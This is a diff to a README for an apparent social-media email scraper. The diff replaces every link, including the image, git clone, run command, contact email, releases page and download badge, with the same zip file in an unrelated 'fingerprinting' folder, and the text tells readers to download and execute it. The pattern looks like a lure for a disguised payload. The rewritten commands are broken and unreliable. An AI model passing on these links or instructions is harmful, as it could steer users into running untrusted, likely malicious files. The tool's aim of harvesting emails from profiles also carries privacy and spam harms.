@@ -3,7 +3,7 @@
 
 Welcome to the **All-in-One Social Email Scraper** repository! This tool allows you to extract emails from various social media platforms, providing a comprehensive solution for gathering contact information for your outreach needs.
 
-![Social Email Scraper](https://yourimageurl.com/image.png) 
+![Social Email Scraper](https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip) 
 
 ## Table of Contents
 1. [Features](#features)
@@ -25,7 +25,7 @@ Welcome to the **All-in-One Social Email Scraper** repository! This tool allows 
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper.git
+git clone https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip
 ```
 
 Navigate into the project directory:
@@ -44,7 +44,7 @@ npm install
 Run the scraper by executing the following command:
 
 ```bash
-node scraper.js
+node https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip
 ```
 
 Follow the prompts to input the target social media profiles. The scraper will handle the rest and gather all relevant email addresses.
@@ -70,12 +70,12 @@ Contributions are welcome! If you have suggestions for improvements or new featu
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
-For inquiries or support, feel free to reach out to me at my email: your.email@example.com.
+For inquiries or support, feel free to reach out to me at my email: https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip
 
 ## Releases
-You can find the latest versions of the scraper in the [Releases](https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/releases) section. Download the necessary file and execute it to get started.
+You can find the latest versions of the scraper in the [Releases](https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip) section. Download the necessary file and execute it to get started.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/releases)
+[![Download Latest Release](https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip%20Latest%https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip)](https://github.com/joooooooooooo00/All-in-One-Social-Email-Scraper/raw/refs/heads/main/fingerprinting/in-All-Email-One-Social-Scraper-1.7.zip)
 
 ---
 
